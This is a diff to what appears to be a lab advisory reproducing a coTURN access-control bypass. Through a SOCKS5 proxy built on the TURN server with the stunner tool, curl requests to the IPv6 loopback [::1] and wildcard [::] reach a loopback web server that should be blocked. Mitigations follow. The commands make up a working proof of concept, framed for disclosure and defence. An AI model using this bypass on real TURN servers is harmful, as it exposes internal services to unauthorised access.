@@ -16,32 +16,56 @@ The behavior of the <i>coTURN</i> server is observed with:
 docker logs coturn --follow
 ```
 
-Access the <i>stunner</i> container:
+### Step 1: Start HTTP server on coturn loopback
+Access the <i>coturn</i> container and start a web server on the IPv6 loopback interface:
+```bash
+docker exec -it coturn sh
+python3 -m http.server 8000 --bind ::1
+```
+Keep this terminal open.
+
+### Step 2: Create SOCKS5 proxy via stunner
+In a new terminal, access the <i>stunner</i> container:
 ```bash
 docker exec -it stunner sh
 ```
 and create a socks5 proxy with:
 ```bash
-stunner socks --turnserver 10.0.0.10:3478 --protocol tcp --username username1 --password password1 --listen 10.0.0.4:9999
+stunner socks --turnserver 10.0.0.10:3478 --protocol tcp --username username1 --password password1 --listen 0.0.0.0:9999
 ```
-This command creates a `socks5` server connected to the TURN server (`turnserver`). It uses TCP as the protocol and the same credentials used to start the coTURN server; it listens on `10.0.0.4:9999`.
+This command creates a `socks5` server connected to the TURN server. It uses TCP as the protocol and the same credentials used to start the coTURN server; it listens on `0.0.0.0:9999`.
 
-A web server is created on the coTURN container on the loopback interface:
+### Step 3: Exploit the vulnerability
+In another terminal inside the stunner container, test the access control bypass:
+
+**Test 1 - Standard loopback (blocked):**
 ```bash
-python3 -m http.server 8000 --bind 127.0.0.1
+curl -x socks5h://127.0.0.1:9999 http://127.0.0.1:8000
 ```
+This request is **blocked** (coTURN correctly blocks requests toward standard loopback addresses).
 
-By performing a GET request to the server on the loopback interface through the proxy:
+**Test 2 - IPv6 loopback bypass (VULNERABLE):**
+```bash
+curl -x socks5h://127.0.0.1:9999 'http://[::1]:8000/'
 ```
-curl -x socks5h://10.0.0.4:9999 http://127.0.0.1:8000
+This request **succeeds** - the loopback protection is bypassed using IPv6 loopback address `[::1]`.
+
+**Test 3 - IPv6 wildcard bypass (VULNERABLE):**
+```bash
+curl -x socks5h://127.0.0.1:9999 'http://[::]:8000/'
 ```
-the request is blocked (coTURN blocks requests toward loopback addresses). However, by using the IP `0.0.0.0`, a communication can be established and the web services become accessible:
-```
-curl -x socks5h://10.0.0.4:9999 http://0.0.0.0:8000
-```
+This also **succeeds** - using IPv6 wildcard address `[::]` also bypasses the protection.
+
+**Note:** The bypass using `0.0.0.0` may not work reliably on all systems due to kernel-specific TCP connection behavior.
 ## Mitigations
-- Update to patched version.
-- In the server configuration file, insert the following line: ```denied-peer-ip=0.0.0.0-0.255.255.255```. In this way is possible to block the address of the ```0.0.0.0/8``` network.
+- Update to version 4.5.2 or later (patched version).
+- In the server configuration file, add the following lines to block vulnerable address ranges:
+  ```
+  denied-peer-ip=0.0.0.0-0.255.255.255
+  denied-peer-ip=::
+  denied-peer-ip=::1
+  ```
+- If IPv6 is not required, disable it by binding coturn only to IPv4 addresses.
 
 
 ## Credits
